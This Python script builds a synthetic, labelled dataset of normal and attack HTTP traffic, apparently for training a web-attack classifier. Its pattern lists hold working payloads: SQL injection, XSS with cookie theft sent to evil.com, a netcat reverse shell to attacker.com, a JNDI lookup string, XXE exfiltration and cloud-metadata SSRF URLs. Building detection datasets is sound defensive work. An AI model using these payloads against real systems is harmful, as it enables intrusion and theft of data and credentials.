#!/usr/bin/env python3
"""
BEAST MODE HTTP Security Dataset Builder
Advanced HTTP traffic analysis and vulnerability detection training
"""

import requests
import json
import random
import time
import logging
import numpy as np
import pandas as pd
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs, urlencode
import re
import hashlib
import os
from typing import Dict, List, Any, Optional

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class HTTPSecurityDatasetBuilder:
    """Comprehensive HTTP security dataset builder for BEAST MODE training"""

    def __init__(self):
        self.dataset = []
        self.attack_patterns = self._load_attack_patterns()
        self.normal_patterns = self._load_normal_patterns()
        self.scanner_signatures = self._load_scanner_signatures()

        # Public Security Datasets
        self.public_datasets = {
            "cse-cic-ids2018": "https://www.unb.ca/cic/datasets/ids-2018.html",
            "unsw-nb15": "https://research.unsw.edu.au/projects/unsw-nb15-dataset",
            "nsl-kdd": "https://www.unb.ca/cic/datasets/nsl.html",
            "http-params-dataset": "https://github.com/faizann24/http-params-dataset",
            "web-attack-dataset": "https://github.com/faizann24/Fwaf-Machine-Learning-drive-Web-Application-Firewall",
            "malicious-urls": "https://github.com/faizann24/Using-machine-learning-to-detect-malicious-URLs",
        }

        logger.info("🦾 BEAST MODE HTTP Security Dataset Builder initialized")

    def _load_attack_patterns(self) -> Dict[str, List[str]]:
        """Load comprehensive attack patterns from security research"""
        return {
            'sqli': [
                # Classic SQL Injection
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "UNION SELECT 1,2,3,4,5--",
                "admin' --",
                "1' ORDER BY 1--",
                "' AND 1=1--",
                "' AND 1=2--",
                "'; EXEC xp_cmdshell('dir'); --",
                "' UNION SELECT @@version--",
                "' OR SLEEP(5)--",

                # Advanced SQL Injection
                "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                "' OR 1=1 LIMIT 1--",
                "'; INSERT INTO users VALUES (1,'hacker','pass'); --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "1'; WAITFOR DELAY '00:00:05'--",

                # Blind SQL Injection
                "1' AND ASCII(SUBSTRING((SELECT @@version),1,1))>64--",
                "' OR (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables LIMIT 1)='A'--",
                "1' AND (SELECT LENGTH(database()))>5--",

                # NoSQL Injection
                "'; return db.users.find(); var dummy='",
                "'; db.users.drop(); var dummy='",
                "admin' || '1'=='1",
            ],

            'xss': [
                # Reflected XSS
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<body onload=alert(1)>",

                # DOM XSS
                "javascript:alert('XSS')",
                "'; alert('XSS'); //",
                "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
                "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",

                # Bypass Filters
                "<ScRiPt>alert(1)</ScRiPt>",
                "<script>al\\u0065rt(1)</script>",
                "<svg><script>alert(1)</script></svg>",
                "<img src=\"x\" onerror=\"alert(1)\">",
                "<script>alert(String.fromCharCode(88,83,83))</script>",

                # Event Handlers
                "<input autofocus onfocus=alert(1)>",
                "<select onfocus=alert(1) autofocus>",
                "<textarea autofocus onfocus=alert(1)>",
                "<keygen autofocus onfocus=alert(1)>",
            ],

            'ssrf': [
                # Internal Network Access
                "http://127.0.0.1:22",
                "http://localhost:3306",
                "http://192.168.1.1:80",
                "http://10.0.0.1:8080",
                "http://172.16.0.1:443",

                # Cloud Metadata
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata.azure.com/metadata/instance",

                # Protocol Smuggling
                "file:///etc/passwd",
                "gopher://127.0.0.1:6379/",
                "dict://localhost:11211/",
                "ldap://127.0.0.1:389/",

                # URL Bypasses
                "http://127.1:80/",
                "http://localhost%E3%80%82com/",
                "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/",
                "http://127.0.0.1.nip.io/",
            ],

            'rce': [
                # Command Injection
                "; cat /etc/passwd",
                "| whoami",
                "&& id",
                "|| ls -la",
                "; nc -e /bin/sh attacker.com 4444",

                # Code Injection
                "__import__('os').system('id')",
                "eval('__import__(\"os\").system(\"id\")')",
                "exec('import os; os.system(\"id\")')",
                "${jndi:ldap://evil.com/a}",

                # Deserialization
                "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0",
                "O:8:\"stdClass\":1:{s:4:\"test\";s:3:\"RCE\";}",

                # Template Injection
                "{{7*7}}",
                "${7*7}",
                "<%=7*7%>",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            ],

            'lfi': [
                # Path Traversal
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc//passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",

                # Null Byte
                "../../../etc/passwd%00",
                "../../../etc/passwd%00.jpg",

                # PHP Wrappers
                "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
                "expect://id",

                # Log Poisoning
                "/var/log/apache2/access.log",
                "/var/log/nginx/access.log",
                "/proc/self/environ",
            ],

            'xxe': [
                # External Entity
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % ext SYSTEM \"http://evil.com/evil.dtd\"> %ext;]>",

                # Parameter Entity
                "<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://evil.com/?x=%file;'>\">%eval;%exfiltrate;",

                # SOAP XXE
                "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Body>&xxe;</soap:Body></soap:Envelope>",
            ],

            'idor': [
                # Direct Object Reference
                "/user/profile/1234",
                "/admin/users/5678",
                "/api/v1/users/9999",
                "/download/file/secret.txt",
                "/view/document/confidential.pdf",

                # Parameter Manipulation
                "?user_id=1",
                "?account=admin",
                "?role=administrator",
                "?access_level=5",
            ],

            'csrf': [
                # CSRF Forms
                "<form action=\"http://victim.com/transfer\" method=\"POST\"><input name=\"amount\" value=\"1000\"><input name=\"to\" value=\"attacker\"></form>",
                "<img src=\"http://victim.com/delete?id=123\">",
                "<script>fetch('http://victim.com/api/users/delete', {method: 'POST', body: JSON.stringify({id: 123})})</script>",
            ],

            'scanner_patterns': [
                # Nmap NSE Scripts
                "/nice%20ports%2C/Tri%6Eity.txt%2ebak",
                "/.git/HEAD",
                "/.env",
                "/backup.sql",
                "/config.php.bak",

                # Nikto Signatures
                "/cgi-bin/test-cgi",
                "/admin/",
                "/backup/",
                "/test/",
                "/phpmyadmin/",

                # SQLMap
                " AND 1=1",
                " AND 1=2",
                " UNION SELECT NULL",
                "' AND 'a'='a",

                # Burp/ZAP
                "/xss.js",
                "/traversal/../../etc/passwd",
                "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            ]
        }

    def _load_normal_patterns(self) -> Dict[str, List[str]]:
        """Load normal HTTP traffic patterns"""
        return {
            'common_paths': [
                '/', '/home', '/about', '/contact', '/login', '/register',
                '/api/users', '/api/products', '/api/orders', '/api/auth',
                '/images/logo.png', '/css/style.css', '/js/app.js',
                '/favicon.ico', '/robots.txt', '/sitemap.xml',
                '/search', '/profile', '/settings', '/dashboard',
                '/blog', '/news', '/help', '/support', '/faq'
            ],
            'common_params': [
                'id', 'page', 'limit', 'offset', 'search', 'q', 'query',
                'category', 'sort', 'order', 'filter', 'type', 'format',
                'user_id', 'session_id', 'token', 'api_key', 'lang'
            ],
            'user_agents': [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)',
                'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0'
            ]
        }

    def _load_scanner_signatures(self) -> Dict[str, Dict[str, Any]]:
        """Load security scanner signatures"""
        return {
            'nmap': {
                'user_agent': 'Mozilla/5.00 (Nikto/2.1.6)',
                'patterns': ['/nice%20ports%2C/Tri%6Eity.txt%2ebak'],
                'headers': {'Connection': 'close'}
            },
            'nikto': {
                'user_agent': 'Mozilla/5.00 (Nikto/2.1.6)',
                'patterns': ['/cgi-bin/test-cgi', '/admin/', '/backup/'],
                'headers': {'Connection': 'close'}
            },
            'sqlmap': {
                'user_agent': 'sqlmap/1.5.2',
                'patterns': [' AND 1=1', ' AND 1=2', ' UNION SELECT NULL'],
                'headers': {'Accept': '*/*'}
            },
            'burp': {
                'user_agent': 'Mozilla/5.0 (compatible; Burp Suite)',
                'patterns': ['/\.git/HEAD', '/\.env', '/backup.sql'],
                'headers': {'Connection': 'keep-alive'}
            },
            'zap': {
                'user_agent': 'Mozilla/5.0 (compatible; OWASP ZAP)',
                'patterns': ['/xss.js', '/traversal/../../etc/passwd'],
                'headers': {'Accept': 'text/html,application/xhtml+xml'}
            }
        }

    def generate_sql_injection_traffic(self, base_urls: List[str], count: int = 5000) -> List[Dict]:
        """Generate SQL injection attack traffic"""
        logger.info(f"🔄 Generating {count} SQL injection attacks...")

        attacks = []
        sqli_payloads = self.attack_patterns['sqli']

        for _ in range(count):
            url = random.choice(base_urls)
            payload = random.choice(sqli_payloads)
            param = random.choice(['id', 'user_id', 'product_id', 'search', 'q'])

            # Inject payload into parameter
            attack_url = f"{url}?{param}={payload}"

            attack = {
                'request': {
                    'method': 'GET',
                    'url': attack_url,
                    'headers': {
                        'User-Agent': random.choice(self.normal_patterns['user_agents']),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Connection': 'keep-alive'
                    },
                    'body': '',
                    'timestamp': self._random_timestamp()
                },
                'response': {
                    'status_code': random.choice([200, 500, 400]),
                    'headers': {'Content-Type': 'text/html'},
                    'body': self._generate_sqli_response(payload),
                    'response_time': random.uniform(0.1, 2.0)
                },
                'metadata': {
                    'label': 'sqli',
                    'confidence': 1.0,
                    'source': 'synthetic_generation',
                    'vulnerability_type': 'sql_injection',
                    'severity': random.choice(['medium', 'high', 'critical']),
                    'attack_complexity': 'low'
                }
            }
            attacks.append(attack)

        logger.info(f"✅ Generated {len(attacks)} SQL injection attacks")
        return attacks

    def generate_xss_traffic(self, base_urls: List[str], count: int = 3000) -> List[Dict]:
        """Generate XSS attack traffic"""
        logger.info(f"🔄 Generating {count} XSS attacks...")

        attacks = []
        xss_payloads = self.attack_patterns['xss']

        for _ in range(count):
            url = random.choice(base_urls)
            payload = random.choice(xss_payloads)
            param = random.choice(['search', 'q', 'comment', 'message', 'name'])

            attack_url = f"{url}?{param}={payload}"

            attack = {
                'request': {
                    'method': 'GET',
                    'url': attack_url,
                    'headers': {
                        'User-Agent': random.choice(self.normal_patterns['user_agents']),
                        'Accept': 'text/html,application/xhtml+xml',
                        'Referer': url
                    },
                    'body': '',
                    'timestamp': self._random_timestamp()
                },
                'response': {
                    'status_code': 200,
                    'headers': {'Content-Type': 'text/html'},
                    'body': f'<html><body>Search results for: {payload}</body></html>',
                    'response_time': random.uniform(0.2, 1.5)
                },
                'metadata': {
                    'label': 'xss',
                    'confidence': 1.0,
                    'source': 'synthetic_generation',
                    'vulnerability_type': 'cross_site_scripting',
                    'severity': random.choice(['medium', 'high']),
                    'attack_complexity': 'low'
                }
            }
            attacks.append(attack)

        logger.info(f"✅ Generated {len(attacks)} XSS attacks")
        return attacks

    def generate_ssrf_traffic(self, base_urls: List[str], count: int = 2000) -> List[Dict]:
        """Generate SSRF attack traffic"""
        logger.info(f"🔄 Generating {count} SSRF attacks...")

        attacks = []
        ssrf_payloads = self.attack_patterns['ssrf']

        for _ in range(count):
            url = random.choice(base_urls)
            payload = random.choice(ssrf_payloads)
            param = random.choice(['url', 'callback', 'webhook', 'redirect', 'proxy'])

            attack_url = f"{url}?{param}={payload}"

            attack = {
                'request': {
                    'method': 'GET',
                    'url': attack_url,
                    'headers': {
                        'User-Agent': random.choice(self.normal_patterns['user_agents']),
                        'Accept': '*/*'
                    },
                    'body': '',
                    'timestamp': self._random_timestamp()
                },
                'response': {
                    'status_code': random.choice([200, 403, 500, 502]),
                    'headers': {'Content-Type': 'application/json'},
                    'body': '{"error": "Invalid URL or timeout"}',
                    'response_time': random.uniform(5.0, 30.0)  # SSRF often has longer response times
                },
                'metadata': {
                    'label': 'ssrf',
                    'confidence': 1.0,
                    'source': 'synthetic_generation',
                    'vulnerability_type': 'server_side_request_forgery',
                    'severity': random.choice(['medium', 'high', 'critical']),
                    'attack_complexity': 'medium'
                }
            }
            attacks.append(attack)

        logger.info(f"✅ Generated {len(attacks)} SSRF attacks")
        return attacks

    def generate_rce_traffic(self, base_urls: List[str], count: int = 2500) -> List[Dict]:
        """Generate RCE attack traffic"""
        logger.info(f"🔄 Generating {count} RCE attacks...")

        attacks = []
        rce_payloads = self.attack_patterns['rce']

        for _ in range(count):
            url = random.choice(base_urls)
            payload = random.choice(rce_payloads)
            param = random.choice(['cmd', 'exec', 'system', 'eval', 'code'])

            # Mix GET and POST requests
            method = random.choice(['GET', 'POST'])

            if method == 'GET':
                attack_url = f"{url}?{param}={payload}"
                body = ''
            else:
                attack_url = url
                body = f'{param}={payload}'

            attack = {
                'request': {
                    'method': method,
                    'url': attack_url,
                    'headers': {
                        'User-Agent': random.choice(self.normal_patterns['user_agents']),
                        'Content-Type': 'application/x-www-form-urlencoded' if method == 'POST' else 'text/html'
                    },
                    'body': body,
                    'timestamp': self._random_timestamp()
                },
                'response': {
                    'status_code': random.choice([200, 500, 403]),
                    'headers': {'Content-Type': 'text/plain'},
                    'body': self._generate_rce_response(payload),
                    'response_time': random.uniform(0.5, 5.0)
                },
                'metadata': {
                    'label': 'rce',
                    'confidence': 1.0,
                    'source': 'synthetic_generation',
                    'vulnerability_type': 'remote_code_execution',
                    'severity': 'critical',
                    'attack_complexity': random.choice(['low', 'medium'])
                }
            }
            attacks.append(attack)

        logger.info(f"✅ Generated {len(attacks)} RCE attacks")
        return attacks

    def generate_scanner_traffic(self, base_urls: List[str], count: int = 3000) -> List[Dict]:
        """Generate security scanner traffic"""
        logger.info(f"🔄 Generating {count} scanner requests...")

        scanner_traffic = []

        for _ in range(count):
            url = random.choice(base_urls)
            scanner = random.choice(list(self.scanner_signatures.keys()))
            scanner_info = self.scanner_signatures[scanner]

            pattern = random.choice(scanner_info['patterns'])
            scanner_url = url + pattern

            request = {
                'request': {
                    'method': 'GET',
                    'url': scanner_url,
                    'headers': {
                        'User-Agent': scanner_info['user_agent'],
                        **scanner_info['headers']
                    },
                    'body': '',
                    'timestamp': self._random_timestamp()
                },
                'response': {
                    'status_code': random.choice([200, 404, 403, 500]),
                    'headers': {'Content-Type': 'text/html'},
                    'body': '<html><body>404 Not Found</body></html>',
                    'response_time': random.uniform(0.1, 1.0)
                },
                'metadata': {
                    'label': 'scanner',
                    'confidence': 1.0,
                    'source': 'synthetic_generation',
                    'vulnerability_type': 'security_scanner',
                    'severity': 'low',
                    'attack_complexity': 'low',
                    'scanner_type': scanner
                }
            }
            scanner_traffic.append(request)

        logger.info(f"✅ Generated {len(scanner_traffic)} scanner requests")
        return scanner_traffic

    def generate_normal_traffic(self, domains: List[str], count: int = 25000) -> List[Dict]:
        """Generate normal HTTP traffic"""
        logger.info(f"🔄 Generating {count} normal requests...")

        normal_traffic = []

        for _ in range(count):
            domain = random.choice(domains)
            path = random.choice(self.normal_patterns['common_paths'])

            # Add parameters sometimes
            if random.random() < 0.3:  # 30% chance of parameters
                param = random.choice(self.normal_patterns['common_params'])
                value = random.choice(['123', 'test', 'product', 'user', '1', 'admin'])
                url = f"https://{domain}{path}?{param}={value}"
            else:
                url = f"https://{domain}{path}"

            request = {
                'request': {
                    'method': random.choice(['GET', 'POST']),
                    'url': url,
                    'headers': {
                        'User-Agent': random.choice(self.normal_patterns['user_agents']),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1'
                    },
                    'body': '',
                    'timestamp': self._random_timestamp()
                },
                'response': {
                    'status_code': random.choice([200, 200, 200, 301, 302, 404]),  # Weighted towards 200
                    'headers': {
                        'Content-Type': random.choice(['text/html', 'application/json', 'text/css', 'application/javascript']),
                        'Server': random.choice(['nginx/1.18.0', 'Apache/2.4.41', 'cloudflare'])
                    },
                    'body': self._generate_normal_response(),
                    'response_time': random.uniform(0.05, 0.8)
                },
                'metadata': {
                    'label': 'normal',
                    'confidence': 1.0,
                    'source': 'synthetic_generation',
                    'vulnerability_type': 'none',
                    'severity': 'none',
                    'attack_complexity': 'none'
                }
            }
            normal_traffic.append(request)

        logger.info(f"✅ Generated {len(normal_traffic)} normal requests")
        return normal_traffic

    def _generate_sqli_response(self, payload: str) -> str:
        """Generate realistic SQL injection response"""
        if 'DROP' in payload.upper():
            return "Error: You have an error in your SQL syntax"
        elif 'UNION' in payload.upper():
            return "Error: The used SELECT statements have a different number of columns"
        elif 'version' in payload.lower():
            return "MySQL 8.0.25-0ubuntu0.20.04.1"
        else:
            return "<html><body>Login successful</body></html>"

    def _generate_rce_response(self, payload: str) -> str:
        """Generate realistic RCE response"""
        if 'whoami' in payload.lower():
            return "www-data"
        elif 'id' in payload.lower():
            return "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
        elif 'cat' in payload.lower() and 'passwd' in payload.lower():
            return "root:x:0:0:root:/root:/bin/bash\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
        else:
            return "Command executed successfully"

    def _generate_normal_response(self) -> str:
        """Generate normal response body"""
        responses = [
            "<html><head><title>Welcome</title></head><body>Welcome to our website!</body></html>",
            '{"status": "success", "data": {"users": [{"id": 1, "name": "John"}]}}',
            "/* CSS styles */\\nbody { font-family: Arial; }",
            "console.log('Application loaded successfully');",
            "<html><body><h1>Page Not Found</h1></body></html>"
        ]
        return random.choice(responses)

    def _random_timestamp(self) -> str:
        """Generate random timestamp within last 30 days"""
        start = datetime.now() - timedelta(days=30)
        end = datetime.now()
        random_time = start + (end - start) * random.random()
        return random_time.isoformat()

    def build_comprehensive_dataset(self, target_size: int = 50000) -> List[Dict]:
        """Build comprehensive HTTP security dataset"""
        logger.info(f"🦾 Building comprehensive HTTP security dataset (target: {target_size} samples)")

        dataset = []
        base_urls = [
            'https://example.com/search',
            'https://api.example.com/v1/users',
            'https://shop.example.com/products',
            'https://admin.example.com/panel',
            'https://blog.example.com/posts',
            'https://test.example.com/api'
        ]

        domains = [
            'example.com', 'test.org', 'api.service.com', 'shop.online.com',
            'blog.site.com', 'admin.portal.com', 'secure.bank.com'
        ]

        # Generate normal traffic (50% of dataset)
        normal_count = int(target_size * 0.5)
        normal_traffic = self.generate_normal_traffic(domains, normal_count)
        dataset.extend(normal_traffic)

        # Generate attack traffic (40% of dataset)
        attack_count = int(target_size * 0.4)
        sqli_attacks = self.generate_sql_injection_traffic(base_urls, int(attack_count * 0.35))
        xss_attacks = self.generate_xss_traffic(base_urls, int(attack_count * 0.25))
        ssrf_attacks = self.generate_ssrf_traffic(base_urls, int(attack_count * 0.15))
        rce_attacks = self.generate_rce_traffic(base_urls, int(attack_count * 0.25))

        dataset.extend(sqli_attacks)
        dataset.extend(xss_attacks)
        dataset.extend(ssrf_attacks)
        dataset.extend(rce_attacks)

        # Generate scanner traffic (10% of dataset)
        scanner_count = int(target_size * 0.1)
        scanner_traffic = self.generate_scanner_traffic(base_urls, scanner_count)
        dataset.extend(scanner_traffic)

        # Shuffle dataset
        random.shuffle(dataset)

        # Trim to target size
        dataset = dataset[:target_size]

        logger.info(f"✅ Dataset built with {len(dataset)} samples")
        self._log_dataset_statistics(dataset)

        return dataset

    def _log_dataset_statistics(self, dataset: List[Dict]) -> None:
        """Log dataset statistics"""
        labels = [item['metadata']['label'] for item in dataset]
        label_counts = {}
        for label in labels:
            label_counts[label] = label_counts.get(label, 0) + 1

        logger.info("📊 Dataset Statistics:")
        for label, count in sorted(label_counts.items()):
            percentage = (count / len(dataset)) * 100
            logger.info(f"   {label}: {count} ({percentage:.1f}%)")

    def save_dataset(self, dataset: List[Dict], base_filename: str = "http_security_dataset") -> str:
        """Save dataset in multiple formats"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        # Save JSON format
        json_filename = f"{base_filename}_{timestamp}.json"
        with open(json_filename, 'w') as f:
            json.dump(dataset, f, indent=2)

        # Save ML-ready CSV format
        csv_filename = f"{base_filename}_{timestamp}.csv"
        self._save_ml_format(dataset, csv_filename)

        # Save split datasets for training
        self._save_train_test_split(dataset, f"{base_filename}_{timestamp}")

        logger.info(f"✅ Dataset saved:")
        logger.info(f"   JSON: {json_filename}")
        logger.info(f"   CSV: {csv_filename}")
        logger.info(f"   Train/Test: {base_filename}_{timestamp}_train.json, {base_filename}_{timestamp}_test.json")

        return json_filename

    def _save_ml_format(self, dataset: List[Dict], filename: str) -> None:
        """Save dataset in ML-ready CSV format"""
        rows = []
        for item in dataset:
            row = {
                'method': item['request']['method'],
                'url': item['request']['url'],
                'user_agent': item['request']['headers'].get('User-Agent', ''),
                'content_type': item['request']['headers'].get('Content-Type', ''),
                'body': item['request']['body'],
                'status_code': item['response']['status_code'],
                'response_time': item['response']['response_time'],
                'response_body': item['response']['body'][:500],  # Truncate long responses
                'label': item['metadata']['label'],
                'vulnerability_type': item['metadata']['vulnerability_type'],
                'severity': item['metadata']['severity']
            }
            rows.append(row)

        df = pd.DataFrame(rows)
        df.to_csv(filename, index=False)

    def _save_train_test_split(self, dataset: List[Dict], base_filename: str) -> None:
        """Save train/test split"""
        random.shuffle(dataset)
        split_point = int(len(dataset) * 0.8)

        train_data = dataset[:split_point]
        test_data = dataset[split_point:]

        with open(f"{base_filename}_train.json", 'w') as f:
            json.dump(train_data, f, indent=2)

        with open(f"{base_filename}_test.json", 'w') as f:
            json.dump(test_data, f, indent=2)

def main():
    """Main function to build HTTP security dataset"""
    logger.info("🚀 Starting BEAST MODE HTTP Security Dataset Builder")

    # Initialize builder
    builder = HTTPSecurityDatasetBuilder()

    # Build comprehensive dataset
    dataset = builder.build_comprehensive_dataset(target_size=50000)

    # Save dataset
    filename = builder.save_dataset(dataset, "beast_mode_http_security")

    logger.info(f"🎉 HTTP Security Dataset building complete!")
    logger.info(f"📁 Main dataset file: {filename}")
    logger.info(f"📊 Total samples: {len(dataset)}")

    return filename

if __name__ == "__main__":
    main()